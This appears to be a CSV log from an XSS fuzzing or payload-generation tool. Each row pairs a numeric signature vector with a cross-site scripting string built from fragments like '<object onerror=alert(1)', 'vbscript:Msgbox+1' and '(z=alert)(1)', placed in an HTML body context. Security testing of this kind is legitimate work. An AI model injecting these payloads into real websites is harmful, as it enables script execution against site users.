eval_place,sig_vector,sig_string
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[81, 26, 217, 243, 3]",);<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 243, 3]",);<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[81, 26, 217, 85, 3]",);<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 243, 3]",);<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[81, 26, 217, 243, 211]",);<object onerror=alert(1)<textarea><noframes>
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[81, 26, 217, 243, 3]",);<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 243, 3]",);<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[81, 26, 217, 237, 253]",);<object onerror=alert(1)<style>value
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[256, 26, 217, 243, 282]",vbscript:Msgbox+1<object onerror=alert(1)<textarea>(z=alert)(1)
body_tag,"[256, 26, 217, 243, 3]",vbscript:Msgbox+1<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[81, 26, 217, 85, 3]",);<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[81, 26, 217, 85, 3]",);<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[81, 26, 217, 237, 253]",);<object onerror=alert(1)<style>value
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 237, 253]",);<object onerror=alert(1)<style>value
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 85, 3]",getPrototypeOf(<object onerror=alert(1)<!--<video><source/
body_tag,"[81, 26, 217, 237, 253]",);<object onerror=alert(1)<style>value
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[256, 26, 217, 243, 282]",vbscript:Msgbox+1<object onerror=alert(1)<textarea>(z=alert)(1)
body_tag,"[256, 26, 217, 243, 3]",vbscript:Msgbox+1<object onerror=alert(1)<textarea><video><source/
body_tag,"[256, 26, 217, 243, 200]",vbscript:Msgbox+1<object onerror=alert(1)<textarea>key == 'window'
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 243, 3]",);<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 237, 253]",);<object onerror=alert(1)<style>value
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 85, 3]",);<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[256, 26, 217, 243, 200]",vbscript:Msgbox+1<object onerror=alert(1)<textarea>key == 'window'
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 237, 253]",);<object onerror=alert(1)<style>value
body_tag,"[81, 26, 217, 243, 3]",);<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[256, 26, 217, 243, 3]",vbscript:Msgbox+1<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 243, 3]",ng-csp<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[256, 26, 217, 243, 3]",vbscript:Msgbox+1<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 243, 3]",);<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 237, 253]",);<object onerror=alert(1)<style>value
body_tag,"[81, 26, 217, 85, 3]",);<object onerror=alert(1)<!--<video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 282]",getPrototypeOf(<object onerror=alert(1)<textarea>(z=alert)(1)
body_tag,"[256, 26, 217, 243, 3]",vbscript:Msgbox+1<object onerror=alert(1)<textarea><video><source/
body_tag,"[256, 26, 217, 243, 3]",vbscript:Msgbox+1<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 243, 111]",);<object onerror=alert(1)<textarea>alert(
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[152, 26, 217, 243, 3]",</div><object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 237, 253]",);<object onerror=alert(1)<style>value
body_tag,"[81, 26, 217, 237, 253]",);<object onerror=alert(1)<style>value
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[204, 26, 217, 85, 3]",ng-csp<object onerror=alert(1)<!--<video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[81, 26, 217, 243, 111]",);<object onerror=alert(1)<textarea>alert(
body_tag,"[81, 26, 217, 237, 253]",);<object onerror=alert(1)<style>value
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[256, 26, 217, 243, 3]",vbscript:Msgbox+1<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[152, 26, 217, 243, 3]",</div><object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
body_tag,"[172, 26, 217, 243, 3]",getPrototypeOf(<object onerror=alert(1)<textarea><video><source/
